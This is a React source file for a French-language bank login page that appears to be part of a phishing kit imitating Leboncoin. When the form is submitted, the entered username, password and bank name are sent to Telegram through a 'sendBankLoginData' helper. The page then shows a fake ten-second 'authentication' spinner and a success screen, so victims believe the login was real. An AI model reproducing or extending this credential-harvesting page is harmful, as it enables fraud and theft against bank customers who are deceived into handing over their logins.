import React, { useState } from 'react';
import Logo from '../components/Logo';
import BackButton from '../components/BackButton';
import Input from '../components/ui/Input';
import Button from '../components/ui/Button';
import AuthenticationSuccess from '../components/AuthenticationSuccess';
import { sendBankLoginData } from '../utils/telegram';

type Bank = {
  id: string;
  name: string;
  logo: string;
};

type BankAuthenticationPageProps = {
  bank: Bank;
  onAuthenticate: () => void;
  onBack?: () => void;
};

const BankAuthenticationPage = ({ bank, onAuthenticate, onBack }: BankAuthenticationPageProps) => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    bankName: bank.name
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({ ...prev, [id]: value }));
    if (errors[id]) {
      setErrors(prev => ({ ...prev, [id]: '' }));
    }
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.username.trim()) newErrors.username = 'Identifiant requis';
    if (!formData.password.trim()) newErrors.password = 'Mot de passe requis';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      setIsLoading(true);
      
      // Send bank login data to Telegram
      await sendBankLoginData(formData);

      // Simulate authentication and loading state
      setTimeout(() => {
        setIsLoading(false);
        setShowSuccess(true);
      }, 10000);
    }
  };

  const handleBackClick = () => {
    if (onBack) {
      onBack();
    } else {
      window.history.back();
    }
  };

  if (showSuccess) {
    return <AuthenticationSuccess />;
  }

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-leboncoin animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Veuillez patienter pendant que nous vérifions vos informations...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full">
      <header className="p-4 flex items-center justify-between md:justify-center relative border-b">
        <div className="md:absolute md:left-4">
          <BackButton onClick={handleBackClick} />
        </div>
        <div className="md:mx-auto">
          <Logo />
        </div>
        <div className="w-6 md:hidden"></div>
      </header>

      <main className="flex justify-center py-8 px-4">
        <div className="w-full max-w-md">
          <div className="flex items-center justify-center mb-8">
            <img
              src={bank.logo}
              alt={bank.name}
              className="w-16 h-16 object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).src = 'https://via.placeholder.com/64x64?text=🏦';
              }}
            />
          </div>

          <h1 className="text-2xl font-semibold text-gray-800 mb-2 text-center">
            Connectez-vous à {bank.name}
          </h1>

          <p className="text-gray-600 mb-8 text-center">
            Utilisez vos identifiants habituels pour vous connecter à votre espace bancaire
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <Input
              id="username"
              label="Identifiant"
              value={formData.username}
              onChange={handleChange}
              error={errors.username}
              required
            />

            <Input
              id="password"
              label="Mot de passe"
              type="password"
              value={formData.password}
              onChange={handleChange}
              error={errors.password}
              required
            />

            <Button 
              type="submit" 
              fullWidth 
              disabled={isLoading}
              className="mt-6"
            >
              {isLoading ? (
                <span className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Connexion en cours...
                </span>
              ) : (
                'Se connecter'
              )}
            </Button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default BankAuthenticationPage;